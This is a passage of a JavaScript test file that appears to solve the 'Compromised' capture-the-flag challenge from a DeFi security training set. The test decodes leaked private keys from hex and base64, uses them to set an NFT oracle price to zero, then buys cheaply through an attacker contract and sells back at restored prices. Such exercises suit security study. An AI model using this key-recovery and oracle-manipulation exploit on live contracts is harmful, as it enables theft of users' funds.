...
describe('Compromised challenge', function () {
    ...
    it('Exploit', async function () {        
        ...
        const customFactory
          = await ethers.getContractFactory("AttackCompromised", attacker);
        const custom
          = await customFactory.deploy(attacker.address, this.nftToken.address);

        // leaked data containing two base64 encoded private keys
        ...
        // bytes to ascii
        let text1 = "";
        const cleaned1 = data1.replaceAll(" ", "");
        for (let i = 0; i < cleaned1.length -1; i=i+2) {
          const hex = "0x"+cleaned1[i]+cleaned1[i+1];
          text1 += String.fromCharCode(hex);
        }

        let text2 = "";
        const cleaned2 = data2.replaceAll(" ", "");
        for (let i = 0; i < cleaned2.length -1; i=i+2) {
          const hex = "0x"+cleaned2[i]+cleaned2[i+1];
          text2 += String.fromCharCode(hex);
        }

        // decode private keys
        const pk1 = atob(text1);
        const pk2 = atob(text2);
        console.log("pk1:", pk1);
        console.log("pk2:", pk2);

        // verify addresses match
        const wallet1 = new ethers.Wallet(pk1).connect(ethers.provider);
        const wallet2 = new ethers.Wallet(pk2).connect(ethers.provider);
        ...
        // report new low prices with leaked accounts
        await this.oracle.connect(wallet1).postPrice("DVNFT", 0);
        await this.oracle.connect(wallet2).postPrice("DVNFT", 0);

        const allPrices = await this.oracle.getAllPricesForSymbol("DVNFT");
        console.log("new prices:", allPrices);

        // buy with new prices
        const tx = await custom.populateTransaction.buy(this.exchange.address);
        tx.value = 100;
        ...
        // sell with restored prices
        await custom.connect(attacker).sell(this.exchange.address);
    });
